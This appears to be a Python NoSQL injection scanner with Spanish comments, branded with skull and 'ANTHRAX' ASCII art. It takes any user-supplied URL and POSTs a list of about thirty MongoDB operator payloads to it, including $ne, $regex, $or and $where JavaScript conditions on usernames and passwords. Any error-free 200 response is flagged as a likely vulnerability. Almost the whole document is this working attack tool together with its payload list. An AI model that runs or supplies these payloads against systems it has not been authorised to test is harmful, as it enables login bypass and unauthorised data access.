import requests
import json

def nosql_injection_tool(url, payloads):
    headers = {'Content-Type': 'application/json'}
    
    for payload, description in payloads.items():
        try:
            # Convertir el payload de cadena JSON a diccionario
            payload_dict = json.loads(payload)
            
            # Enviar la solicitud con el payload
            response = requests.post(url, json={"search": payload_dict}, headers=headers)
            
            # Analizar la respuesta
            if response.status_code == 200 and "error" not in response.text.lower():
                print(f"Posible vulnerabilidad de inyección NoSQL detectada con el siguiente payload: {payload}")
                print(f"Descripción: {description}\n")
            else:
                print(f"Ninguna vulnerabilidad detectada con el payload: {payload}")
        except Exception as e:
            print(f"Error: {e}")

if __name__ == "__main__":
    # ASCII ART SKULL: https://ascii.co.uk/art/skulls
    # ASCII ART TEXT: https://patorjk.com/software/taag/#p=display&f=Banner3-D&t=NoSQLi
    # ASCII ART TEXT: https://patorjk.com/software/taag/#p=display&f=Banner3-D&t=ANTHRAX%0A
    print("""
                          :::!~!!!!!:.
                  .xUHWH!! !!?M88WHX:.          
                .X*#M@$!!  !X!M$$$$$$WWx:.
               :!!!!!!?H! :!$!$$$$$$$$$$8X:
              !!~  ~:~!! :~!$!#$$$$$$$$$$8X:
             :!~::!H!<   ~.U$X!?R$$$$$$$$MM!
             ~!~!!!!~~ .:XW$$$U!!?$$$$$$RMM!
               !:~~~ .:!M"T#$$$$WX??#MRRMMM!
               ~?WuxiW*`   `"#$$$$8!!!!??!!!
             :X- M$$$$       `"T#$T~!8$WUXU~
            :%`  ~#$$$m:        ~!~ ?$$$$$$
          :!`.-   ~T$$$$8xx.  .xWW- ~""##*"
.....   -~~:<` !    ~?T#$$@@W@*?$$      /`
W$@@M!!! .!~~ !!     .:XUW$W!~ `"~:    :
#"~~`.:x%`!!  !H:   !WM$$$$Ti.: .!WUn+!`
:::~:!!`:X~ .: ?H.!u "$$$B$$$!W:U!T$$M~
.~~   :X@!.-~   ?@WTWo("*$$$W$TH$! `
Wi.~!X$?!-~    : ?$$$B$Wu("**$RM!
$R@i.~~ !     :   ~$$$$$B$$en:``
?MXT@Wx.~    :     ~"##*$$$$M~   
:::'###::::'##::: ##:'########:'##::::'##:'########:::::'###::::'##::::'##:
::'## ##::: ###:: ##:... ##..:: ##:::: ##: ##.... ##:::'## ##:::. ##::'##::
:'##:. ##:: ####: ##:::: ##:::: ##:::: ##: ##:::: ##::'##:. ##:::. ##'##:::
'##:::. ##: ## ## ##:::: ##:::: #########: ########::'##:::. ##:::. ###::::
 #########: ##. ####:::: ##:::: ##.... ##: ##.. ##::: #########::: ## ##:::
 ##.... ##: ##:. ###:::: ##:::: ##:::: ##: ##::. ##:: ##.... ##:: ##:. ##::
 ##:::: ##: ##::. ##:::: ##:::: ##:::: ##: ##:::. ##: ##:::: ##: ##:::. ##:
..:::::..::..::::..:::::..:::::..:::::..::..:::::..::..:::::..::..:::::..::
        '##::: ##::'#######:::'######:::'#######::'##:::::::'####:
        ###:: ##:'##.... ##:'##... ##:'##.... ##: ##:::::::. ##::
        ####: ##: ##:::: ##: ##:::..:: ##:::: ##: ##:::::::: ##::
        ## ## ##: ##:::: ##:. ######:: ##:::: ##: ##:::::::: ##::
        ##. ####: ##:::: ##::..... ##: ##:'## ##: ##:::::::: ##::
        ##:. ###: ##:::: ##:'##::: ##: ##:.. ##:: ##:::::::: ##::
        ##::. ##:. #######::. ######::: ##### ##: ########:'####:
        ..::::..:::.......::::......::::.....:..::........::....::
    """)
    print("NOSQL INJECTION TOOL")
    print("Ingrese la URL del endpoint a probar (o ingrese '1' para salir):")
    
    while True:
        url = input("URL: ").strip()

        # Validación básica de la URL
        if url == "1":
            print("Saliendo...")
            break

        if url.startswith("http://") or url.startswith("https://"):
            # Diccionario de payloads para probar NoSQL Injection con descripciones
            # NoSQL injection https://book.hacktricks.xyz/v/es/pentesting-web/nosql-injection
            # NoSQLi https://github.com/cr0hn/nosqlinjection_wordlists/blob/master/mongodb_nosqli.txt
            payloads = {
                '{"username": {"$ne": null}}': 'Diferente de null',
                '{"username": {"$gt": ""}}': 'Mayor que cadena vacía',
                '{"username": {"$lt": "a"}}': 'Menor que "a"',
                '{"username": {"$gte": ""}}': 'Mayor o igual que cadena vacía',
                '{"username": {"$lte": "a"}}': 'Menor o igual que "a"',
                '{"username": {"$eq": ""}}': 'Igual a cadena vacía',
                '{"username": {"$exists": true}}': 'Existe',
                '{"username": {"$regex": ".*"}}': 'Coincide con cualquier cosa (regex)',
                '{"username": {"$ne": "admin"}}': 'Usuario diferente de admin',
                '{"password": {"$ne": "password"}}': 'Contraseña diferente de "password"',
                '{"username": {"$in": ["admin", "user"]}}': 'Usuario en lista',
                '{"password": {"$nin": ["password1", "password2"]}}': 'Contraseña no en lista',
                '{"$or": [{"username": "admin"}, {"password": "password"}]}': 'Usuario es admin o contraseña es password',
                '{"$and": [{"username": "admin"}, {"password": {"$ne": "password"}}]}': 'Usuario es admin y contraseña no es password',
                '{"$where": "this.username == \'admin\'"}': 'Evaluación JavaScript para MongoDB',
                '{"$where": "this.password.length > 8"}': 'Contraseña mayor a 8 caracteres',
                '{"$where": "this.username.length == 5"}': 'Usuario con longitud de 5 caracteres',
                '{"username": {"$type": 2}}': 'Tipo de dato string',
                '{"username": {"$type": 3}}': 'Tipo de dato objeto',
                '{"username": {"$type": 4}}': 'Tipo de dato array',
                '{"username": {"$expr": {"$gt": [{"$strLenCP": "$username"}, 4]}}}': 'Longitud del nombre de usuario mayor a 4 caracteres',
                '{"username": {"$jsonSchema": {"required": ["username", "password"]}}}': 'Cumple con el esquema JSON especificado',
                '{"username": {"$mod": [4, 0]}}': 'Módulo',
                '{"username": {"$text": {"$search": "admin"}}}': 'Búsqueda de texto',
                '{"username": {"$all": ["admin", "user"]}}': 'Contiene todos los valores en la lista',
                '{"username": {"$size": 1}}': 'Tamaño del array',
                '{"username": {"$bitsAllSet": 1}}': 'Bits establecidos',
                '{"username": {"$bitsAnySet": 1}}': 'Cualquier bit establecido',
                '{"username": {"$bitsAllClear": 0}}': 'Todos los bits limpios',
                '{"username": {"$bitsAnyClear": 0}}': 'Cualquier bit limpio'
            }

            nosql_injection_tool(url, payloads)
        else:
            print("Error: La URL debe comenzar con 'http://' o 'https://'. Por favor, ingrese una nueva URL o '1' para salir.")
